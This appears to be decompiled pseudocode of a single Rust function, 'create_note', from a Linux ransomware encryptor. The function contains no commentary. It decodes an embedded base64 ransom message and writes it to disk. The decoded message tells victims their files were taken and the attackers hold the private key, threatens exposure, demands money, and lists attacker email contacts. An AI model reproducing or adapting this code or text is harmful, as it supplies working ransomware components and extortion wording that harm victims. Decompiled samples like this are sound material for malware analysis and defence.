int linux_encryptor::files::create_note::hd3c91fc90c0b0684()
{
    char *v0;  // [sp-0x10e8], Other Possible Types: unsigned long
    unsigned long long v1;  // [sp-0x10e0], Other Possible Types: unsigned long
    void* v2;  // [sp-0x10d8], Other Possible Types: unsigned long long
    unsigned long long v3;  // [sp-0x10c8]
    void* v4;  // [sp-0x10c0]
    unsigned long v5;  // [sp-0x10b0]
    char *v6;  // [bp-0x10a8], Other Possible Types: unsigned long
    unsigned long long v7;  // [sp-0x1098]
    char *v8;  // [sp-0x1088]
    unsigned long long v9;  // [sp-0x1078]
    unsigned long v10;  // [sp-0x1070]
    unsigned long long v11;  // [sp-0x1068]
    unsigned long long v12;  // [sp-0x1060]
    unsigned int *v13;  // [bp-0x1058], Other Possible Types: char *, unsigned long
    void* v14;  // [sp-0x1050], Other Possible Types: unsigned long long, unsigned long
    char *v15;  // [bp-0x1048], Other Possible Types: unsigned int *, char
    char *v16;  // [sp-0x1038]
    char v17;  // [bp-0x1028]
    unsigned short v18;  // [bp-0x28]
    unsigned long long v20;  // rdi
    char *v21;  // rsi
    char *v22;  // rax
    unsigned long long v23;  // r14
    unsigned long long v24;  // rbx
    unsigned int *v25;  // rbx
    char *v26;  // rcx
    unsigned long long v27;  // rdx
    unsigned long long v28;  // rdx
    unsigned long long v29;  // rsi
    unsigned long long v31;  // rdx
    unsigned int v32;  // esi
    unsigned int v33;  // ebx
    unsigned int v34;  // edi
    unsigned long long v35;  // rbx
    char *v36;  // rcx
    unsigned long long v37;  // rdx
    unsigned long long v38;  // rdx
    unsigned long long v39;  // rsi
    unsigned long long v41;  // rax
    unsigned int v42;  // edx
    unsigned int v43;  // edi
    unsigned int v44;  // esi
    unsigned long long v45;  // rax
    unsigned long long v46;  // rsi
    unsigned long long v47;  // rdx

    _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::h3549ccdcce7dad99(&v13, v20);
    v21 = *((long long *)&v15);
    if (v14 - v21 <= 6)
    {
        alloc::raw_vec::RawVec$LT$T$C$A$GT$::reserve::do_reserve_and_handle::h0efe5460ba49e6e2(&v13, v21, 7);
        v21 = *((long long *)&v15);
    }
    v22 = v13;
    *((unsigned int *)(v22 + v21 + 3)) = 761621860;
    *((unsigned int *)(v22 + v21)) = 1684104562;
    v2 = v21 + 7;
    *((int128_t *)&v0) = *((int128_t *)&v13);
    core::str::converts::from_utf8::hbf99f44e098525d0(&v13, "Luna.ini.exe.dll.lnk", 4);
    if (v13)
    {
        *((int128_t *)&v6) = *((int128_t *)&(&v13)[1]);
        core::result::unwrap_failed::hddd78f4658ac7d0f("called `Result::unwrap()` on an `Err` valueG7upJjpoF4sq5LzhM5m3rsHPKXwzAL3b63qPFM3K9j0=src/files.rsError while opening file: \n", 43, &v6, &g_473eb0, &g_474120); /* do not return */
    }
    v23 = *((long long *)&v15);
    v24 = v2;
    if (v1 - v24 < v23)
    {
        alloc::raw_vec::RawVec$LT$T$C$A$GT$::reserve::do_reserve_and_handle::h0efe5460ba49e6e2(&v0, v24, v23);
        v24 = v2;
    }
    memcpy(v0 + v24, v14, v23);
    v25 = v24 + v23;
    v15 = v25;
    *((int128_t *)&v13) = *((int128_t *)&v0);
    if (v14 - (char *)v25 <= 3)
    {
        alloc::raw_vec::RawVec$LT$T$C$A$GT$::reserve::do_reserve_and_handle::h0efe5460ba49e6e2(&v13, v25, 4);
        v25 = v15;
    }
    *((unsigned int *)(v13 + v25)) = 1954051118;
    v9 = v25 + 1;
    *((int128_t *)&v8) = *((int128_t *)&v13);
    v26 = "W1dIQVQgSEFQUEVORUQ/XQ0KDQpBbGwgeW91ciBmaWxlcyB3ZXJlIG1vdmVkIHRvIHNlY3VyZSBzdG9yYWdlLg0KTm9ib2R5IGNhbiBoZWxwIHlvdSwgZXhjZXB0IHVzLg0KV2UgaGF2ZSBwcml2YXRlIGtleSwgd2UgaGF2ZSB5b3VyIGJsYWNrIHNoaXQuDQpXZSBhcmUgc3Ryb25nbHkgYWR2aWNlIHlvdSB0byBiZSBpbnRlcmVzdGVkIGluIHNhZmV0eSBvZiB5b3VyIGZpbGVzLCBhcyB3ZSBjYW4gc2hvdyB5b3VyIHJlYWwgZmFjZS4NCg0KW1dIQVQgRE8gV0UgTkVFRD9dDQoNCkFkbWlzc2lvbiwgcmVzcGVjdCBhbmQgbW9uZXkuDQpZb3VyIGluZm9ybWF0aW9uIGNvc3RzIG1vbmV5Lg0KDQpbV0hPIEFSRSBXRT9dDQpBIGxpdHRsZSB0ZWFtIG9mIHBlb3BsZSB3aG8gY2FuIHNob3cgeW91ciBwcm9ibGVtcy4NCg0KW0hPVyBUTyBSRUFDSCBBTiBBR1JFRU1FTlQgV0lUSCBZT1U/XQ0KDQpTZW5kIHVzIGEgbWVzc2FnZSB3aXRoIHRob3NlIGUtbWFpbHM6DQoJZ2l2ZWZpc2h0b2FtYW42NjZAcHJvdG9ubWFpbC5jb20NCglnaXZlaG9va3RvYW1hbjY2NkBwcm90b25tYWlsLmNvbQ0KDQogICA";
    v27 = 746;
    do
    {
        v28 = v27;
        if (v26 == "Error while writing note\nError: ")
            core::panicking::panic::h8705e81f284be8a5("called `Option::unwrap()` on a `None` valuecalled `Result::unwrap()` on an `Err` valueG7upJjpoF4sq5LzhM5m3rsHPKXwzAL3b63qPFM3K9j0=src/files.rsError while opening file: \n", 43, &g_4740f0); /* do not return */
        v29 = *(v26);
        if ((char)v29 >= 0)
        {
            v26 += 1;
        }
        else if ((v29 & 255) < 224)
        {
            v26 += 2;
        }
        else if ((v29 & 255) < 240)
        {
            v26 += 3;
        }
        else if ((v26[3] & 63 | (unsigned int)((v26[2] & 63) * 64) | (unsigned int)((v26[1] & 63) * 0x1000) | (unsigned int)(((unsigned int)v29 & 7) * 0x40000)) != 0x110000)
        {
            v26 += 4;
        }
        else
        {
            core::panicking::panic::h8705e81f284be8a5("called `Option::unwrap()` on a `None` valuecalled `Result::unwrap()` on an `Err` valueG7upJjpoF4sq5LzhM5m3rsHPKXwzAL3b63qPFM3K9j0=src/files.rsError while opening file: \n", 43, &g_4740f0); /* do not return */
        }
        v27 = v28 - 1;
    } while (v28 != 1);
    if (v26 == "Error while writing note\nError: ")
        core::panicking::panic::h8705e81f284be8a5("called `Option::unwrap()` on a `None` valuecalled `Result::unwrap()` on an `Err` valueG7upJjpoF4sq5LzhM5m3rsHPKXwzAL3b63qPFM3K9j0=src/files.rsError while opening file: \n", 43, &g_4740f0); /* do not return */
    v31 = *(v26);
    if ((char)v31 >= 0)
    {
LABEL_40b975:
        v35 = 559;
        if (!((unsigned int)v31 == 61))
            goto LABEL_40babe;
    }
    else
    {
        v32 = (unsigned int)v31 & 31;
        v33 = v26[1] & 63;
        if ((v31 & 255) <= 223)
        {
            v35 = 559;
            if (!(((unsigned int)(v32 * 64) | v33) == 61))
                goto LABEL_40babe;
        }
        else
        {
            v34 = v26[2] & 63 | (unsigned int)(v33 * 64);
            if ((v31 & 255) < 240)
            {
                v35 = 559;
                if (!((v34 | (unsigned int)(v32 * 0x1000)) == 61))
                    goto LABEL_40babe;
            }
            else
            {
                v31 = v26[3] & 63 | (unsigned int)(v34 * 64) | (unsigned int)((v32 & 7) * 0x40000);
                if ((unsigned int)v31 == 0x110000)
                    core::panicking::panic::h8705e81f284be8a5("called `Option::unwrap()` on a `None` valuecalled `Result::unwrap()` on an `Err` valueG7upJjpoF4sq5LzhM5m3rsHPKXwzAL3b63qPFM3K9j0=src/files.rsError while opening file: \n", 43, &g_4740f0); /* do not return */
                goto LABEL_40b975;
            }
        }
    }
    v36 = "W1dIQVQgSEFQUEVORUQ/XQ0KDQpBbGwgeW91ciBmaWxlcyB3ZXJlIG1vdmVkIHRvIHNlY3VyZSBzdG9yYWdlLg0KTm9ib2R5IGNhbiBoZWxwIHlvdSwgZXhjZXB0IHVzLg0KV2UgaGF2ZSBwcml2YXRlIGtleSwgd2UgaGF2ZSB5b3VyIGJsYWNrIHNoaXQuDQpXZSBhcmUgc3Ryb25nbHkgYWR2aWNlIHlvdSB0byBiZSBpbnRlcmVzdGVkIGluIHNhZmV0eSBvZiB5b3VyIGZpbGVzLCBhcyB3ZSBjYW4gc2hvdyB5b3VyIHJlYWwgZmFjZS4NCg0KW1dIQVQgRE8gV0UgTkVFRD9dDQoNCkFkbWlzc2lvbiwgcmVzcGVjdCBhbmQgbW9uZXkuDQpZb3VyIGluZm9ybWF0aW9uIGNvc3RzIG1vbmV5Lg0KDQpbV0hPIEFSRSBXRT9dDQpBIGxpdHRsZSB0ZWFtIG9mIHBlb3BsZSB3aG8gY2FuIHNob3cgeW91ciBwcm9ibGVtcy4NCg0KW0hPVyBUTyBSRUFDSCBBTiBBR1JFRU1FTlQgV0lUSCBZT1U/XQ0KDQpTZW5kIHVzIGEgbWVzc2FnZSB3aXRoIHRob3NlIGUtbWFpbHM6DQoJZ2l2ZWZpc2h0b2FtYW42NjZAcHJvdG9ubWFpbC5jb20NCglnaXZlaG9va3RvYW1hbjY2NkBwcm90b25tYWlsLmNvbQ0KDQogICA";
    v37 = 745;
    do
    {
        v38 = v37;
        if (v36 == "Error while writing note\nError: ")
            core::panicking::panic::h8705e81f284be8a5("called `Option::unwrap()` on a `None` valuecalled `Result::unwrap()` on an `Err` valueG7upJjpoF4sq5LzhM5m3rsHPKXwzAL3b63qPFM3K9j0=src/files.rsError while opening file: \n", 43, &g_474108); /* do not return */
        v39 = *(v36);
        if ((char)v39 >= 0)
        {
            v36 += 1;
        }
        else if ((v39 & 255) < 224)
        {
            v36 += 2;
        }
        else if ((v39 & 255) < 240)
        {
            v36 += 3;
        }
        else
        {
            if ((v36[3] & 63 | (unsigned int)((v36[2] & 63) * 64) | (unsigned int)((v36[1] & 63) * 0x1000) | (unsigned int)(((unsigned int)v39 & 7) * 0x40000)) == 0x110000)
                core::panicking::panic::h8705e81f284be8a5("called `Option::unwrap()` on a `None` valuecalled `Result::unwrap()` on an `Err` valueG7upJjpoF4sq5LzhM5m3rsHPKXwzAL3b63qPFM3K9j0=src/files.rsError while opening file: \n", 43, &g_474108); /* do not return */
            v36 += 4;
        }
        v37 = v38 - 1;
    } while (v38 != 1);
    if (v36 == "Error while writing note\nError: ")
        core::panicking::panic::h8705e81f284be8a5("called `Option::unwrap()` on a `None` valuecalled `Result::unwrap()` on an `Err` valueG7upJjpoF4sq5LzhM5m3rsHPKXwzAL3b63qPFM3K9j0=src/files.rsError while opening file: \n", 43, &g_474108); /* do not return */
    v41 = *(v36);
    if ((char)v41 < 0)
    {
        v42 = (unsigned int)v41 & 31;
        v43 = v36[1] & 63;
        if ((v41 & 255) <= 223)
        {
            v41 = (unsigned int)(v42 * 64) | v43;
        }
        else
        {
            v44 = v36[2] & 63 | (unsigned int)(v43 * 64);
            if ((v41 & 255) < 240)
            {
                v41 = v44 | (unsigned int)(v42 * 0x1000);
            }
            else
            {
                v41 = v36[3] & 63 | (unsigned int)(v44 * 64) | (unsigned int)((v42 & 7) * 0x40000);
                if ((unsigned int)v41 == 0x110000)
                    core::panicking::panic::h8705e81f284be8a5("called `Option::unwrap()` on a `None` valuecalled `Result::unwrap()` on an `Err` valueG7upJjpoF4sq5LzhM5m3rsHPKXwzAL3b63qPFM3K9j0=src/files.rsError while opening file: \n", 43, &g_474108); /* do not return */
            }
        }
    }
    v35 = 558 - ((unsigned int)v41 == 61);
LABEL_40babe:
    v45 = __rust_alloc_zeroed(v35, 1);
    if (!v45)
        alloc::alloc::handle_alloc_error::h17f9e80a43aee885(); /* do not return */
    v10 = v45;
    v11 = v35;
    v12 = v35;
    memset(&v17, 0, 0x1000);
    v13 = "W1dIQVQgSEFQUEVORUQ/XQ0KDQpBbGwgeW91ciBmaWxlcyB3ZXJlIG1vdmVkIHRvIHNlY3VyZSBzdG9yYWdlLg0KTm9ib2R5IGNhbiBoZWxwIHlvdSwgZXhjZXB0IHVzLg0KV2UgaGF2ZSBwcml2YXRlIGtleSwgd2UgaGF2ZSB5b3VyIGJsYWNrIHNoaXQuDQpXZSBhcmUgc3Ryb25nbHkgYWR2aWNlIHlvdSB0byBiZSBpbnRlcmVzdGVkIGluIHNhZmV0eSBvZiB5b3VyIGZpbGVzLCBhcyB3ZSBjYW4gc2hvdyB5b3VyIHJlYWwgZmFjZS4NCg0KW1dIQVQgRE8gV0UgTkVFRD9dDQoNCkFkbWlzc2lvbiwgcmVzcGVjdCBhbmQgbW9uZXkuDQpZb3VyIGluZm9ybWF0aW9uIGNvc3RzIG1vbmV5Lg0KDQpbV0hPIEFSRSBXRT9dDQpBIGxpdHRsZSB0ZWFtIG9mIHBlb3BsZSB3aG8gY2FuIHNob3cgeW91ciBwcm9ibGVtcy4NCg0KW0hPVyBUTyBSRUFDSCBBTiBBR1JFRU1FTlQgV0lUSCBZT1U/XQ0KDQpTZW5kIHVzIGEgbWVzc2FnZSB3aXRoIHRob3NlIGUtbWFpbHM6DQoJZ2l2ZWZpc2h0b2FtYW42NjZAcHJvdG9ubWFpbC5jb20NCglnaXZlaG9va3RvYW1hbjY2NkBwcm90b25tYWlsLmNvbQ0KDQogICA";
    v14 = 747;
    v18 = 0;
    *((uint128_t *)&v15) = 0;
    *((uint128_t *)&v16) = 0;
    _$LT$base64_stream..from_base64_reader..FromBase64Reader$LT$R$C$N$GT$$u20$as$u20$std..io..Read$GT$::read::hb3c702596d042c13(&v0, &v13, v45);
    if (v0)
    {
        v6 = v1;
        core::result::unwrap_failed::hddd78f4658ac7d0f("called `Result::unwrap()` on an `Err` valueG7upJjpoF4sq5LzhM5m3rsHPKXwzAL3b63qPFM3K9j0=src/files.rsError while opening file: \n", 43, &v6, &g_473e70, &g_474138); /* do not return */
    }
    v7 = v9;
    v6 = v8;
    v2 = v12;
    *((int128_t *)&v0) = *((int128_t *)&v10);
    v5 = std::fs::write::h5120bf2973c52f89(&v6, &v0);
    if (!v5)
        return;
    v0 = &g_474150;
    v1 = 1;
    v2 = 0;
    v3 = "/rustc/fe5b13d681f25ee6474be29d748c65adcd91f69e/library/core/src/str/pattern.rscalled `Option::unwrap()` on a `None` valuecalled `Result::unwrap()` on an `Err` valueG7upJjpoF4sq5LzhM5m3rsHPKXwzAL3b63qPFM3K9j0=src/files.rsError while opening file: \n";
    v4 = 0;
    std::io::stdio::_print::h7035045a22bdb588(&v0, v46, v47);
    core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h3fc65152347e7263(&v5);
}
